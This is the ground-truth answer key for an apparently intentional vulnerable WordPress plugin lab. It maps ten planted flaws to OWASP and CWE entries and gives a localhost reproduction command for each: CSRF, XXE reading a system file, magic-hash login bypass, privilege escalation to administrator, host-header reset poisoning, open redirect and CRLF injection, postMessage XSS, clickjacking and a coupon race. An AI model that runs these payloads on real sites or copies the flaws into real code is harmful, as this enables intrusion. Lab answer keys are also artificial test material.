# Phase B Ground Truth - bazooka-vuln-pack

Ground-truth fragment for the 10 mini-plugins under
`plugins/bazooka-vuln-pack/`. Format mirrors `docs/VULNERABILITIES.md` so it can
be merged in later.

Author: Ayi NEDJIMI <ayinedjimi@users.noreply.github.com>

Base URL in examples: `http://localhost:8080`

| # | Plugin slug | Vulnerability class | OWASP Top 10 (2021) | CWE | Severity | Repro (curl / HTTP) |
|---|-------------|---------------------|---------------------|-----|----------|---------------------|
| 1 | bz-broken-nonce     | CSRF - AJAX handler with no `check_ajax_referer` | A01 Broken Access Control | CWE-352 | High   | `curl -b cookies.txt -X POST -d 'action=bz_broken_nonce_delete&id=42' http://localhost:8080/wp-admin/admin-ajax.php` |
| 2 | bz-cap-confusion    | Capability misuse: `is_user_logged_in()` instead of `current_user_can('manage_options')` | A01 Broken Access Control | CWE-285 | High   | `curl -b subscriber.txt -X POST -d 'action=bz_cap_set_option&key=blogdescription&value=pwned' http://localhost:8080/wp-admin/admin-ajax.php` |
| 3 | bz-xxe-soap         | XML External Entity (XXE) via `simplexml_load_string` with `LIBXML_NOENT` | A05 Security Misconfiguration | CWE-611 | High   | `printf '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r><name>&x;</name></r>' \| curl -X POST -H 'Content-Type: application/xml' --data-binary @- http://localhost:8080/wp-json/bz/v1/xxe` |
| 4 | bz-type-juggling    | Loose `==` comparison on `md5()` enabling magic-hash bypass | A07 Identification & Auth Failures | CWE-697 | High   | `curl -X POST -d 'user=admin&pass=QNKCDZO' http://localhost:8080/wp-json/bz/v1/tjlogin` |
| 5 | bz-mass-assignment  | REST endpoint accepts arbitrary fields incl. `role` | A04 Insecure Design / A01 | CWE-915 | Critical | `curl -u subscriber:APP_PASSWORD -X POST -H 'Content-Type: application/json' -d '{"role":"administrator"}' http://localhost:8080/wp-json/bz/v1/profile` |
| 6 | bz-host-poisoning   | Password-reset link built from `$_SERVER['HTTP_HOST']` | A03 Injection | CWE-20  | High   | `curl -X POST -H 'Host: attacker.tld' -d 'login=admin' http://localhost:8080/wp-json/bz/v1/reset` (check option `bz_hp_last_link`) |
| 7 | bz-crlf-injection   | Open redirect + CRLF in `Location:` header from `$_GET['url']` | A03 Injection | CWE-113 / CWE-601 | Medium | Open redirect: `curl -i 'http://localhost:8080/?bz_crlf=1&url=https://evil.tld/'` ; CRLF attempt: `curl -i 'http://localhost:8080/?bz_crlf=1&url=/safe%0d%0aX-Injected:%20yes'` |
| 8 | bz-postmessage-xss  | DOM XSS via `window.addEventListener('message')` -> `innerHTML` (no origin check) | A03 Injection | CWE-79  | High   | Frame `http://localhost:8080/wp-admin/admin.php?page=bz-pm-xss` then `iframe.contentWindow.postMessage('<img src=x onerror=alert(1)>', '*')` |
| 9 | bz-no-clickjacking  | Strips `X-Frame-Options` + CSP on admin action page | A05 Security Misconfiguration | CWE-1021 | Medium | `<iframe src="http://localhost:8080/wp-admin/admin.php?page=bz-clickjack" style="opacity:.01;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>` with overlaid decoy button |
|10 | bz-race-coupon      | TOCTOU - coupon check & mark separated by 150ms window | A04 Insecure Design | CWE-367 | High   | Seed: `curl http://localhost:8080/wp-json/bz/v1/coupon/seed` ; race: `seq 1 10 \| xargs -n1 -P10 -I{} curl -s -X POST 'http://localhost:8080/wp-json/bz/v1/coupon/redeem?code=WELCOME10'` ; check: `curl http://localhost:8080/wp-json/bz/v1/coupon/wallet` |

## Notes

- Plugin 7 (`bz-crlf-injection`): full header-splitting payload may be rejected
  by hardened PHP SAPIs (mitigation since PHP 5.1.2). The open-redirect side of
  the bug always reproduces; CRLF works on older/permissive SAPIs.
- Plugin 9 (`bz-no-clickjacking`): the admin action is intentionally non
  destructive (increments a counter) to keep the lab safe-by-default.
- Plugin 10 (`bz-race-coupon`): race window widened to 150 ms via `usleep` so
  the TOCTOU is reliably observable from a laptop without needing thousands of
  parallel requests.
